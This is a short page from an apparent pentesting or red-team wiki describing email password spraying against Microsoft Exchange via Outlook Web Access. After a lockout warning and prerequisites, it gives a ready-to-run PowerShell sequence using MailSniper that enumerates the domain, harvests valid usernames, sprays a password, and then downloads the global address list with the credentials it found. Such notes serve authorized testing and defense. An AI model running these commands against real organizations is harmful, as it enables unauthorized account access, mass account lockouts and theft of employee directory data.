---
layout: default
title: Email Password Spraying
parent: Active Directory
nav_order: 1
permalink: /ad/email/
---

# Email Password Spraying
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

{: .warning }
> This exploit can **lock** a large amount of - or even all - domain accounts. Be careful to **not perform to much attemps** on the same usernames or ensure to **know the enforced password policy** first.

## Vulnerability

If the environement you are targeting includes a Microsoft Exchange instance, you can spray domain usernames and passwords.

## Prerequisites

* Microsoft Exchange is deployed in the target domain.
* Outlook Web Access is reachable.

## Exploit

Using [MailSniper](https://github.com/dafthack/MailSniper).
To generate possible usernames, use [namemash.py](https://gist.github.com/superkojiman/11076951).

```powershell
Import-Module ./MailSniper.ps1

# Enumerate the target.
Invoke-DomainHarvestOWA -ExchHostname mail.$domain

# Spray usernames.
Invoke-UsernameHarvestOWA -ExchHostname mail.$domain -Domain $domain -UserList $usernames -OutFile .\correct.out

# Once you identified correct usernames, spray passwords.
Invoke-PasswordSprayOWA -ExchHostname mail.$domain -UserList .\correct.out -Password $password

# If you manage to discover valid credentials, you can download the global address list.
Get-GlobalAddressList -ExchHostname mail.$domain -UserName $domain\$username -Password $password -OutFile .\list.out
```